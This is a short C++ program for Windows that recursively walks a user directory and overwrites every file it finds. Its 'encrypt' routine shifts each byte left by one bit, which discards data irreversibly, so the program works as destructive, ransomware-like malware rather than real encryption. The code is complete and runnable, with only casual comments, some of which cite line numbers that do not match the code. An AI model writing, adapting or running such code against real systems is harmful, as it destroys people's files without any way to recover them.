//If you decide to make the choice to modify lines 33-38, god bless your soul.
//WindowsAPI and iostream handle spaces and backslashes differently, the checks 
// at line 25, 28, 30, and 32 work with the differences in formating.
#include <iostream>
#include <fstream>
#include <vector>
#include <filesystem>
#include <windows.h>
using namespace std;

void encrypt(string filepath) {
    std::ifstream file(filepath, std::ios::binary);
    std::vector<char> buffer(std::istreambuf_iterator<char>(file), {});
    for (char& byte : buffer) {
        byte = byte << 1;
    }
    std::ofstream outfile(filepath, std::ios::binary);
    outfile.write(buffer.data(), buffer.size());
}

void FindFilesInDirectory(string directory) {
    WIN32_FIND_DATAA data;
    HANDLE hFind;
    string fullPath;
    if (directory.back() == '\\') {// Remove the nefarious doube backslash because SOMETHING takes it litterally and the COMPILER takes it as a single
        directory.pop_back();
    }
    if ((hFind = FindFirstFileA((directory + "\\*").c_str(), &data)) != INVALID_HANDLE_VALUE) {
        do {
            if (strcmp(data.cFileName, ".") != 0 && strcmp(data.cFileName, "..") != 0) {//makes sure it doesnt recuesivecall the same directory
                fullPath = directory + "\\" + data.cFileName;
                if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    FindFilesInDirectory(fullPath);//we do a bit of recusion
                    //std::cout << "DIRECTORY: " << fullPath << "\n";
                }
                else { 
                    cout << "FILE:      " << fullPath << "\n";
                    encrypt(fullPath);
                }
            }
        } while (FindNextFileA(hFind, &data) != 0);
        FindClose(hFind);
    }
}

int main() {
    string root = "C:\\Users\\example\\";//Make this the directory to search for, make sure it ends with a double backslash.
    FindFilesInDirectory(root);
    return 0;
}
